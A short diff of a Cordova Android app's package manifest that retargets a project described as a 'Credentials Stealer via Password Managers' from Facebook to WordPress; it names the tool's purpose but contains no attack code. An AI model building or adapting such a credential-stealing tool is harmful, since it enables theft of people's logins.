@@ -1,7 +1,7 @@
 {
-    "name": "Facebook",
+    "name": "Wordpress",
     "version": "1.1.1",
-    "description": "Facebook Credentials Stealer via Password Managers",
+    "description": "Wordpress Credentials Stealer via Password Managers",
     "dependencies": {
         "cordova-android": "^6.2.3",
         "cordova-plugin-background-mode": "^0.7.2",
